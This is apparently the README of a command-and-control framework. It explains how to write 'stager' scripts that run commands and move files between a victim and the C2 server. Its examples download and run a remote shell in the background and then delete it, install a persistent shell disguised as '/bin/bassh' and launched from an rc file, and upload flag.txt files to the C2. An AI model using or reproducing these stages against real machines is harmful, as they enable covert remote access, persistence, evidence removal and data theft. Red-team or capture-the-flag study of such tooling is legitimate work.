# what are stages
> A stager is a small executable program that is used in multi-stage cyberattacks to set up a connection to a command-and-control (C&C) server and run larger malicious modules. Stagers are often used after malicious actors have exploited vulnerabilities in software to gain access to a victim's system. **They can act as a downloader, dropper, or payload for a larger main payload file.**

## how do i make one?
it's very easy to make one, think duckyscript easy  
first, create a file named whatever, but it must end in `.stage` - in our example, we'll use `payload.stage`  
here are the commands you can use in the stager:
|name| description |
|----|-------------|
|run |run a provided command|
|upload|upload a file from the client to the C2 to the `uploads` directory|
|download|download a file from the C2's `uploads` directory|
|print|print something for logging, debugging, etc.|
|`#ar`|enable autorun for this stage, this must be put on the 1st line of said stage|
|`"""`|same as python's multi-lined comments, whatever you put in this comment will be used as the description for the stage|

pretty basic but it works

## examples

download a round-robin shell, run it, and delete it (linux)
```
#ar
"""
Downloads a shell (rr-all.py), and runs it in the background.
Deletes the shell once ran.
"""

download rr-all.py
run nohup python3 rr-all.py &
run rm rr-all.py
```

<hr>

create a persistent shell, no autorun (linux)
```
"""
Creates a persistent shell, even after reboots.
"""

download rr-all.py
run mv rr-all.py /bin/bassh
run echo "python3 /bin/bassh" > ~/rc.local
```

<hr>

upload `flag.txt` from root folder, and from home
```
"""
Upload `flag.txt` from root folder, and from ~
"""

upload /flag.txt
upload ~/flag.txt
```